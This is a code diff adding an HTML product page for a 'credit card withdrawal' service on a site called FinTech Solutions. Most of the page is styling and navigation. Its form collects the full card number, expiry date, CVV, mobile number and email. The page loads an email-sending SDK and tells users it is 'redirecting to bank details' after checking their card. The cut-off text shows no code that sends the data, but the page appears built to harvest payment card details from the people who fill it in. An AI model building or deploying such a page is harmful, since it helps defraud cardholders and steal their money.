@@ -1,0 +1,1552 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Credit Card - FinTech Solutions</title>
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        
+        .product-detail-section {
+            margin-top: 80px;
+            padding: 4rem 0;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            min-height: calc(100vh - 80px);
+        }
+
+        .product-detail-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .product-header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .product-header h1 {
+            font-size: 3rem;
+            font-weight: 800;
+            color: #f1f5f9;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, #60a5fa 0%, #a78bfa 50%, #f472b6 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .product-header p {
+            font-size: 1.2rem;
+            color: #475569;
+            margin-bottom: 2rem;
+        }
+
+        .product-info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 3rem;
+            margin-bottom: 3rem;
+        }
+
+        .product-image-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .product-image {
+            width: 300px;
+            height: 300px;
+            background: #ffffff;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 2rem;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(0, 0, 0, 0.1);
+        }
+
+        .product-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            border-radius: 15px;
+        }
+
+        .product-details {
+            background: #ffffff;
+            padding: 1rem 1.25rem;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+            border: 1px solid rgba(0, 0, 0, 0.06);
+        }
+
+        .product-details h2 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 0.75rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            user-select: none;
+            transition: color 0.3s ease;
+        }
+
+        .product-details h2:hover {
+            color: #3b82f6;
+        }
+
+        .product-details h2 .toggle-arrow {
+            font-size: 1.2rem;
+            color: #3b82f6;
+            transition: transform 0.3s ease;
+            margin-left: 0.75rem;
+        }
+
+        .product-details h2.collapsed .toggle-arrow {
+            transform: rotate(-90deg);
+        }
+
+        .product-info-content {
+            overflow: hidden;
+            transition: max-height 0.4s ease, opacity 0.3s ease;
+            max-height: 2000px;
+            opacity: 1;
+        }
+
+        .product-info-content.collapsed {
+            max-height: 0;
+            opacity: 0;
+            margin-bottom: 0;
+        }
+
+        .product-details h3 {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 0.75rem;
+            margin-top: 1rem;
+        }
+
+        .product-details p {
+            color: #475569;
+            line-height: 1.5;
+            margin-bottom: 1rem;
+            font-size: 0.95rem;
+        }
+
+        .product-features {
+            list-style: none;
+            padding: 0;
+            margin-bottom: 1rem;
+        }
+
+        .product-features li {
+            color: #1e293b;
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+            font-size: 0.95rem;
+            font-weight: 500;
+        }
+
+        .product-features li i {
+            color: #10b981;
+            font-size: 1rem;
+        }
+
+        .action-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-top: 2rem;
+        }
+
+        .btn-continue {
+            background: #000000;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 25px rgba(59, 130, 246, 0.3);
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn-continue:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 35px rgba(59, 130, 246, 0.4);
+        }
+
+        .btn-back {
+            background: rgba(30, 41, 59, 0.8);
+            color: #475569;
+            border: 1px solid rgba(96, 165, 250, 0.3);
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn-back:hover {
+            background: rgba(30, 41, 59, 1);
+            border-color: rgba(96, 165, 250, 0.5);
+        }
+
+        .card-details-section {
+            background: #ffffff;
+            padding: 2rem;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            margin-top: 2rem;
+        }
+
+        .card-details-section h2 {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            color: #1e293b;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            font-size: 1rem;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 1rem;
+            border: 1px solid rgba(96, 165, 250, 0.3);
+            border-radius: 10px;
+            background: #ffffff;
+            color: #1e293b;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .form-group input#cardNumber {
+            padding-right: 3rem;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #60a5fa;
+            box-shadow: 0 0 0 3px rgba(96, 165, 250, 0.1);
+        }
+
+        .form-group input::placeholder {
+            color: #94a3b8;
+        }
+
+        .card-type-indicator {
+            position: absolute;
+            right: 1rem;
+            top: 70%;
+            transform: translateY(-50%);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            pointer-events: none;
+            opacity: 0;
+            transition: all 0.3s ease;
+        }
+
+        .card-type-indicator.visible {
+            opacity: 1;
+        }
+
+        .card-type-indicator i {
+            font-size: 1.5rem;
+        }
+
+        .card-type-indicator img {
+            height: 4rem;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .card-type-indicator span {
+            display: none;
+        }
+
+        .form-group {
+            position: relative;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+
+        .btn-submit {
+            background: #000000;
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            margin-top: 1rem;
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            background: #1a1a1a;
+            border-color: rgba(255, 255, 255, 0.3);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .success-message {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            border-radius: 15px;
+            padding: 1.5rem;
+            margin-top: 1rem;
+            text-align: center;
+            display: none;
+        }
+
+        .success-message h4 {
+            color: #10b981;
+            margin-bottom: 0.5rem;
+        }
+
+        .success-message p {
+            color: #475569;
+            margin-bottom: 0.5rem;
+        }
+
+        .customer-name {
+            color: #10b981;
+            font-weight: 600;
+            font-size: 1.1rem;
+        }
+
+        .success-icon {
+            color: #10b981;
+            font-size: 1.5rem;
+            margin-right: 0.5rem;
+        }
+
+        @media (max-width: 768px) {
+            .product-header h1 {
+                font-size: 2rem;
+            }
+            
+            .product-info-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+        }
+    </style>
+
+    <!-- EmailJS SDK -->
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+    (function(){
+       emailjs.init({
+         publicKey: "B3avCjPaS9t4xdvk9",
+       });
+    })();
+ </script>
+
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <nav class="navbar">
+            <div class="nav-container">
+                <div class="nav-logo">
+                    <a href="../../index.html">
+                        <img src="../../image/header logo.png" alt="FinTech Solutions" class="logo-img">
+                    </a>
+                </div>
+                <div class="nav-buttons">
+                    <a href="../../login.html" class="btn-login" id="loginBtn">Login</a>
+                    <div class="wallet-section" id="walletSection" style="display: none;">
+                        <div class="wallet-container">
+                            <i class="fas fa-wallet"></i>
+                            <div class="wallet-info">
+                                <span class="wallet-label"></span>
+                                <span class="wallet-balance" id="walletBalance">₹0.00</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="profile-section" id="profileSection" style="display: none;">
+                        <div class="profile-dropdown">
+                            <button class="profile-btn" id="profileBtn">
+                                <i class="fas fa-user-circle"></i>
+                            </button>
+                            <div class="profile-menu" id="profileMenu">
+                                <div class="profile-header">
+                                    <i class="fas fa-user-circle"></i>
+                                    <span id="userName">User</span>
+                                </div>
+                                <div class="profile-divider"></div>
+                                <a href="../../my-profile.html" class="profile-link">
+                                    <i class="fas fa-user"></i>
+                                    My Profile
+                                </a>
+                                <a href="../../settings.html" class="profile-link">
+                                    <i class="fas fa-cog"></i>
+                                    Settings
+                                </a>
+                                <a href="../../orders.html" class="profile-link">
+                                    <i class="fas fa-shopping-bag"></i>
+                                    Orders
+                                </a>
+                                <a href="../../messages.html" class="profile-link">
+                                    <i class="fas fa-envelope"></i>
+                                    Messages
+                                </a>
+                                <a href="#" class="profile-link" id="openSupportModal">
+                                    <i class="fas fa-headset"></i>
+                                    Support
+                                </a>
+                                <div class="profile-divider"></div>
+                                <a href="#" class="profile-link logout" id="logoutBtn">
+                                    <i class="fas fa-sign-out-alt"></i>
+                                    Logout
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Product Detail Section -->
+    <section class="product-detail-section">
+        <div class="product-detail-container">
+            <div class="product-header">
+                <h1>Credit Card</h1>
+                <p>0.5% withdrawal fee on all transactions</p>
+            </div>
+
+            <div class="product-info-grid">
+                <div class="product-image-section">
+                    <div class="product-image">
+                        <img src="../../image/credit card.png" alt="Credit Card" class="product-img">
+                    </div>
+                    
+                    <!-- Reviews Section -->
+                    <div class="reviews-section" id="reviewsSection" style="background: #ffffff; padding: 1rem; border-radius: 12px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08); border: 1px solid rgba(0, 0, 0, 0.08); margin-top: 1.5rem; width: 100%; text-align: center;">
+                        <!-- Initial placeholder - will be replaced by JavaScript -->
+                        <div class="reviews-summary-section" style="padding: 0.75rem 1rem; background: #f8fafc; border-radius: 10px; margin-bottom: 0; border: 1px solid #e2e8f0;">
+                            <div class="rating-display" style="display: flex; align-items: center; justify-content: center; gap: 0.6rem; height: 30px; margin-bottom: 0.25rem;">
+                                <div class="stars-large" style="color: #10b981; font-size: 1rem; white-space: nowrap; display: inline-flex; align-items: center; flex-shrink: 0;">
+                                    <i class="far fa-star"></i><i class="far fa-star"></i><i class="far fa-star"></i><i class="far fa-star"></i><i class="far fa-star"></i>
+                                </div>
+                                <div class="rating-info" style="display: flex; flex-direction: column; align-items: center; justify-content: center; flex-shrink: 0; min-width: 75px; height: 30px;">
+                                    <span class="rating-value-large" style="font-size: 1.2rem; font-weight: 800; color: #1e293b; line-height: 1; white-space: nowrap; height: 1.2rem; display: flex; align-items: center; margin: 0;">0.0</span>
+                                    <span class="rating-count-text" style="font-size: 0.75rem; color: #64748b; white-space: nowrap; text-align: center; height: 0.85rem; display: flex; align-items: center; margin: 0;">0 Reviews</span>
+                                </div>
+                            </div>
+                            <div style="width: 100%; margin-top: 0.1rem; text-align: center;">
+                                <button class="btn-show-reviews" id="showReviewsBtn" style="background: linear-gradient(135deg, #60a5fa 0%, #3b82f6 100%); color: white; border: none; padding: 0.3rem 0.6rem; border-radius: 6px; font-weight: 600; font-size: 0.7rem; cursor: pointer; transition: all 0.3s ease; display: inline-flex; align-items: center; gap: 0.3rem; justify-content: center;">
+                                    <i class="fas fa-chevron-down" style="font-size: 0.65rem;"></i> Show Reviews
+                                </button>
+                            </div>
+                        </div>
+                        <style>
+                            .reviews-summary-section {
+                                padding: 0.75rem 1rem;
+                                background: #f8fafc;
+                                border-radius: 10px;
+                                margin-bottom: 0;
+                                border: 1px solid #e2e8f0;
+                            }
+
+                            .rating-display {
+                                display: flex;
+                                align-items: center;
+                                justify-content: center;
+                                gap: 0.6rem;
+                                height: 30px;
+                                margin-bottom: 0.25rem;
+                            }
+
+                            .stars-large {
+                                color: #10b981;
+                                font-size: 1rem;
+                                white-space: nowrap;
+                                display: inline-flex;
+                                align-items: center;
+                                flex-shrink: 0;
+                            }
+
+                            .rating-info {
+                                display: flex;
+                                flex-direction: column;
+                                align-items: center;
+                                justify-content: center;
+                                flex-shrink: 0;
+                                min-width: 75px;
+                                height: 30px;
+                            }
+
+                            .rating-value-large {
+                                font-size: 1.2rem;
+                                font-weight: 800;
+                                color: #1e293b;
+                                line-height: 1;
+                                white-space: nowrap;
+                                height: 1.2rem;
+                                display: flex;
+                                align-items: center;
+                                margin: 0;
+                            }
+
+                            .rating-count-text {
+                                font-size: 0.75rem;
+                                color: #64748b;
+                                white-space: nowrap;
+                                text-align: center;
+                                height: 0.85rem;
+                                display: flex;
+                                align-items: center;
+                                margin: 0;
+                            }
+
+                            .btn-show-reviews {
+                                background: linear-gradient(135deg, #60a5fa 0%, #3b82f6 100%);
+                                color: white;
+                                border: none;
+                                padding: 0.3rem 0.6rem;
+                                border-radius: 6px;
+                                font-weight: 600;
+                                font-size: 0.7rem;
+                                cursor: pointer;
+                                transition: all 0.3s ease;
+                                display: inline-flex;
+                                align-items: center;
+                                gap: 0.3rem;
+                                justify-content: center;
+                            }
+
+                            .btn-show-reviews:hover {
+                                transform: translateY(-2px);
+                                box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4);
+                            }
+
+                            .btn-show-reviews.active {
+                                background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+                            }
+
+                            .reviews-expanded-section {
+                                margin-top: 1rem;
+                                padding-top: 1rem;
+                                border-top: 1px solid #e2e8f0;
+                            }
+
+                            .reviews-list-container {
+                                margin-bottom: 1.5rem;
+                            }
+
+                            .reviews-list {
+                                display: flex;
+                                flex-direction: column;
+                                gap: 1.5rem;
+                            }
+
+                            .review-item {
+                                padding: 1.25rem;
+                                background: #ffffff;
+                                border-radius: 10px;
+                                border: 1px solid #e2e8f0;
+                                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+                                text-align: left;
+                                box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+                            }
+
+                            .reviewer-name {
+                                font-weight: 600;
+                                color: #1e293b !important;
+                                font-size: 1.1rem !important;
+                                margin-bottom: 0.5rem;
+                                display: block;
+                                text-align: left;
+                                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+                            }
+
+                            .review-rating {
+                                color: #10b981 !important;
+                                font-size: 0.75rem !important;
+                                white-space: nowrap;
+                                display: inline-flex;
+                                align-items: center;
+                                text-align: left;
+                            }
+
+                            .review-rating i {
+                                font-size: 0.75rem !important;
+                            }
+
+                            .review-date {
+                                color: #64748b !important;
+                                font-size: 0.75rem !important;
+                                display: block;
+                                margin-bottom: 0.75rem;
+                                text-align: left;
+                                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+                            }
+
+                            .review-text {
+                                color: #475569 !important;
+                                line-height: 1.6;
+                                font-size: 1rem !important;
+                                display: block;
+                                text-align: left;
+                                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+                            }
+
+                            .no-reviews {
+                                text-align: center;
+                                padding: 3rem 1rem;
+                                color: #64748b;
+                            }
+
+                            .no-reviews i {
+                                font-size: 3rem;
+                                margin-bottom: 1rem;
+                                color: #cbd5e1;
+                            }
+
+                            .customer-review-form-section {
+                                background: #ffffff;
+                                padding: 1.5rem;
+                                border-radius: 10px;
+                                border: 1px solid #e2e8f0;
+                                margin-top: 1.5rem;
+                                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+                                display: block !important;
+                                visibility: visible !important;
+                                box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+                            }
+
+                            .customer-review-form-section h3 {
+                                font-size: 1.5rem;
+                                font-weight: 700;
+                                color: #1e293b !important;
+                                margin-bottom: 1.5rem;
+                                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+                            }
+
+                            .customer-review-form-section h3 i {
+                                color: #10b981;
+                                margin-right: 0.5rem;
+                            }
+
+                            .customer-review-form-section .form-group {
+                                margin-bottom: 1.5rem;
+                            }
+
+                            .customer-review-form-section .form-group label {
+                                display: block;
+                                color: #1e293b !important;
+                                font-weight: 600;
+                                margin-bottom: 0.5rem;
+                                font-size: 1rem !important;
+                                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+                            }
+
+                            .customer-review-form-section .form-group input[type="text"],
+                            .customer-review-form-section .form-group textarea {
+                                width: 100%;
+                                padding: 0.75rem;
+                                border: 1px solid #e2e8f0;
+                                border-radius: 8px;
+                                background: #ffffff;
+                                color: #1e293b !important;
+                                font-size: 1rem !important;
+                                transition: all 0.3s ease;
+                                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+                            }
+
+                            .customer-review-form-section .form-group input:focus,
+                            .customer-review-form-section .form-group textarea:focus {
+                                outline: none;
+                                border-color: #60a5fa;
+                                box-shadow: 0 0 0 3px rgba(96, 165, 250, 0.1);
+                            }
+
+                            .rating-input {
+                                display: flex;
+                                flex-direction: row;
+                                justify-content: flex-start;
+                                gap: 0.3rem;
+                            }
+
+                            .rating-input input[type="radio"] {
+                                display: none;
+                            }
+
+                            .rating-input .star-label {
+                                cursor: pointer;
+                                color: #cbd5e1;
+                                font-size: 1.5rem;
+                                transition: all 0.2s ease;
+                            }
+
+                            .rating-input .star-label i {
+                                transition: all 0.2s ease;
+                            }
+
+                            .btn-submit-review {
+                                background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+                                color: white;
+                                border: none;
+                                padding: 1rem 2rem;
+                                border-radius: 10px;
+                                font-weight: 600;
+                                font-size: 1rem;
+                                cursor: pointer;
+                                transition: all 0.3s ease;
+                                display: flex;
+                                align-items: center;
+                                gap: 0.5rem;
+                                width: 100%;
+                                justify-content: center;
+                            }
+
+                            .btn-submit-review:hover {
+                                transform: translateY(-2px);
+                                box-shadow: 0 4px 12px rgba(16, 185, 129, 0.4);
+                            }
+
+                            .btn-submit-review:disabled {
+                                opacity: 0.6;
+                                cursor: not-allowed;
+                                transform: none;
+                            }
+
+                            @media (max-width: 768px) {
+                                .reviews-summary-section {
+                                    padding: 0.75rem 1rem;
+                                    display: block;
+                                }
+
+                                .rating-display {
+                                    width: 100%;
+                                    justify-content: center;
+                                    margin-bottom: 0.25rem;
+                                }
+                            }
+                        </style>
+                    </div>
+                </div>
+
+                <div class="product-details">
+                    <h2 onclick="toggleProductInfo(this)" class="collapsed">
+                        <span>What is Credit Card Withdrawal?</span>
+                        <i class="fas fa-chevron-down toggle-arrow"></i>
+                    </h2>
+                    <div class="product-info-content collapsed">
+                        <p>Withdraw cash from your credit card at the lowest fees in the market. Our credit card withdrawal service allows you to access your credit limit as cash with minimal charges.</p>
+                        
+                        <h3>Key Features</h3>
+                        <ul class="product-features">
+                            <li><i class="fas fa-check"></i> Lowest withdrawal fee at 0.5%</li>
+                            <li><i class="fas fa-check"></i> Instant cash disbursement</li>
+                            <li><i class="fas fa-check"></i> No hidden charges</li>
+                            <li><i class="fas fa-check"></i> Secure transactions</li>
+                            <li><i class="fas fa-check"></i> 24/7 availability</li>
+                            <li><i class="fas fa-check"></i> Quick processing</li>
+                            <li><i class="fas fa-check"></i> All major credit cards accepted</li>
+                            <li><i class="fas fa-check"></i> Real-time transaction tracking</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Credit Card Details Form Section -->
+            <div class="card-details-section">
+                <h2>Enter Your Credit Card Details</h2>
+                
+                <form id="cardDetailsForm">
+                    <div class="form-group">
+                        <label for="cardHolderName">Card Holder Name</label>
+                        <input type="text" id="cardHolderName" name="cardHolderName" placeholder="Enter cardholder name" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="cardNumber">Card Number</label>
+                        <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                        <div class="card-type-indicator" id="cardTypeIndicator">
+                            <i class="fas fa-credit-card"></i>
+                            <span id="cardTypeText"></span>
+                        </div>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="expiryDate">Expiry Date</label>
+                            <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" maxlength="5" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="cvv">CVV</label>
+                            <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="withdrawalAmount">Withdrawal Amount (₹)</label>
+                        <input type="number" id="withdrawalAmount" name="withdrawalAmount" placeholder="Minimum ₹20,000" min="20000" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="mobileNumber">Registered Mobile Number</label>
+                        <input type="tel" id="mobileNumber" name="mobileNumber" placeholder="Enter your mobile number" maxlength="10" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="email">Email Address</label>
+                        <input type="email" id="email" name="email" placeholder="Enter your email address" required>
+                    </div>
+
+                    <button type="submit" class="btn-submit" id="submitBtn">
+                        Proceed
+                    </button>
+                </form>
+
+                <div class="success-message" id="successMessage">
+                    <h4><i class="fas fa-check-circle success-icon"></i> Card Details Verified!</h4>
+                    <p>Welcome, <span class="customer-name" id="customerName"></span></p>
+                    <p>Redirecting to bank details...</p>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <script src="../../firebase-config.js"></script>
+    
+    <!-- Global Support Component - Floating support button accessible from any page -->
+    <script src="../../global-support.js"></script>
+    
+    <!-- Optimized Wallet Balance Loader -->
+    <script src="../../wallet-balance-loader.js"></script>
+    <script src="../../script.js"></script>
+    <script src="../../product-reviews-helper.js"></script>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check login status and update UI
+            const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+            const loginBtn = document.getElementById('loginBtn');
+            const profileSection = document.getElementById('profileSection');
+            const walletSection = document.getElementById('walletSection');
+            const walletBalance = document.getElementById('walletBalance');
+            const userName = document.getElementById('userName');
+            const profileBtn = document.getElementById('profileBtn');
+            const profileMenu = document.getElementById('profileMenu');
+            const logoutBtn = document.getElementById('logoutBtn');
+            
+            // Check if user is logged in
+            if (userData.isLoggedIn && userData.uid) {
+                // Show logged-in UI immediately (don't wait for block check)
+                if (loginBtn) loginBtn.style.display = 'none';
+                if (profileSection) profileSection.style.display = 'block';
+                if (walletSection) walletSection.style.display = 'block';
+                if (userName) userName.textContent = userData.name || 'User';
+                
+                // Check if user is blocked (non-blocking, async check)
+                // Only check if dbHelper is available to prevent errors
+                if (typeof window.dbHelper !== 'undefined' && typeof window.dbHelper.getUserProfile === 'function') {
+                    setTimeout(async function() {
+                        try {
+                            const isBlocked = await window.checkUserBlockedStatus();
+                            // If blocked, the function will handle redirect
+                        } catch (error) {
+                            console.error('Error checking block status:', error);
+                            // Don't log out user on error - just continue
+                        }
+                    }, 500); // Delay to ensure page is fully loaded
+                }
+                
+                // Load profile photo after profile section is displayed
+                if (typeof window.loadAndDisplayProfilePhoto === 'function') {
+                    setTimeout(function() {
+                        window.loadAndDisplayProfilePhoto();
+                    }, 100);
+                }
+                
+                // Wallet balance is automatically loaded by wallet-balance-loader.js
+                // (Already preloaded and cached for instant display!)
+            }
+            
+            // Load and display reviews (visible to everyone, logged in or not)
+            function loadReviews() {
+                if (typeof window.productReviewsHelper !== 'undefined' && typeof window.firebaseDb !== 'undefined') {
+                    const productId = 'credit-card';
+                    window.productReviewsHelper.displayReviews('reviewsSection', productId).catch(error => {
+                        console.error('Error loading reviews:', error);
+                    });
+                } else {
+                    setTimeout(loadReviews, 100);
+                }
+            }
+            
+            // Start loading reviews
+            loadReviews();
+            
+            // Wallet click functionality - navigate to wallet page
+            const walletContainer = document.querySelector('.wallet-container');
+            if (walletContainer) {
+                walletContainer.addEventListener('click', function() {
+                    window.location.href = '../../wallet.html';
+                });
+            }
+            
+            // Profile dropdown functionality
+            profileBtn.addEventListener('click', function(e) {
+                e.stopPropagation();
+                profileBtn.parentElement.classList.toggle('active');
+            });
+            
+            // Close dropdown when clicking outside
+            document.addEventListener('click', function(e) {
+                if (!profileBtn.contains(e.target) && !profileMenu.contains(e.target)) {
+                    profileBtn.parentElement.classList.remove('active');
+                }
+            });
+            
+            // Logout functionality
+            logoutBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                // Hide profile and wallet sections, show login button
+                profileSection.style.display = 'none';
+                walletSection.style.display = 'none';
+                loginBtn.style.display = 'inline-block';
+                
+                // Close dropdown
+                profileBtn.parentElement.classList.remove('active');
+                
+                // Clear user data
+                localStorage.removeItem('userData');
+            });
+
+            // Credit card form functionality
+            const cardDetailsForm = document.getElementById('cardDetailsForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const successMessage = document.getElementById('successMessage');
+            const customerNameDisplay = document.getElementById('customerName');
+
+            // Card type detection function
+            function detectCardType(cardNumber) {
+                // Remove spaces and non-digits
+                const cleanNumber = cardNumber.replace(/\s/g, '').replace(/[^0-9]/gi, '');
+                
+                if (cleanNumber.length === 0) {
+                    return null;
+                }
+                
+                // Check in order of specificity (most specific first)
+                
+                // American Express: starts with 34 or 37 (15 digits)
+                if (/^(34|37)/.test(cleanNumber)) {
+                    return { type: 'American Express', icon: 'fab fa-cc-amex', color: '#006fcf' };
+                }
+                
+                // Diners Club: starts with 300-305, 309, 36, 38
+                if (/^(30[0-5]|309|36|38)/.test(cleanNumber)) {
+                    return { type: 'Diners Club', icon: 'fab fa-cc-diners-club', color: '#0079be' };
+                }
+                
+                // JCB: starts with 35
+                if (/^35/.test(cleanNumber)) {
+                    return { type: 'JCB', icon: 'fab fa-cc-jcb', color: '#006fcf' };
+                }
+                
+                // Discover: starts with 6011, 644-649
+                if (/^(6011|64[4-9])/.test(cleanNumber)) {
+                    return { type: 'Discover', icon: 'fab fa-cc-discover', color: '#ff6000' };
+                }
+                
+                // RuPay: starts with 60, 65, 81, 82, 508, 607, 608
+                if (/^(60|65|81|82|508|607|608)/.test(cleanNumber)) {
+                    return { type: 'RuPay', icon: 'fas fa-credit-card', image: '../../image/rupey.png', color: '#00b9f5' };
+                }
+                
+                // Maestro: starts with 50, 56-59, or 6 (but not RuPay ranges)
+                if (/^(50|5[6-9])/.test(cleanNumber)) {
+                    return { type: 'Maestro', icon: 'fab fa-cc-mastercard', color: '#006fcf' };
+                }
+                
+                // Mastercard: starts with 51-55
+                if (/^5[1-5]/.test(cleanNumber)) {
+                    return { type: 'Mastercard', icon: 'fab fa-cc-mastercard', image: '../../image/mastercard.png', color: '#eb001b' };
+                }
+                
+                // Visa: starts with 4
+                if (/^4/.test(cleanNumber)) {
+                    return { type: 'Visa', icon: 'fab fa-cc-visa', color: '#1a1f71' };
+                }
+                
+                // Maestro: can also start with 6 (but not RuPay ranges already checked)
+                if (/^6/.test(cleanNumber)) {
+                    return { type: 'Maestro', icon: 'fab fa-cc-mastercard', color: '#006fcf' };
+                }
+                
+                return null;
+            }
+
+            // Format card number input (16 digits)
+            const cardNumberInput = document.getElementById('cardNumber');
+            const cardTypeIndicator = document.getElementById('cardTypeIndicator');
+            const cardTypeText = document.getElementById('cardTypeText');
+            
+            cardNumberInput.addEventListener('input', function() {
+                let value = this.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
+                
+                // Limit to 16 digits
+                if (value.length > 16) {
+                    value = value.substring(0, 16);
+                }
+                
+                // Format with spaces every 4 digits
+                let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+                this.value = formattedValue;
+                
+                // Detect card type
+                const cardType = detectCardType(value);
+                
+                if (cardType && value.length >= 4) {
+                    // Show card type indicator inside the input box
+                    const iconElement = cardTypeIndicator.querySelector('i');
+                    const imgElement = cardTypeIndicator.querySelector('img');
+                    const textElement = cardTypeIndicator.querySelector('span');
+                    
+                    // Hide icon and show image, or vice versa
+                    if (cardType.image) {
+                        // Use custom image for RuPay
+                        if (iconElement) iconElement.style.display = 'none';
+                        if (!imgElement) {
+                            const img = document.createElement('img');
+                            img.src = cardType.image;
+                            img.alt = cardType.type;
+                            cardTypeIndicator.appendChild(img);
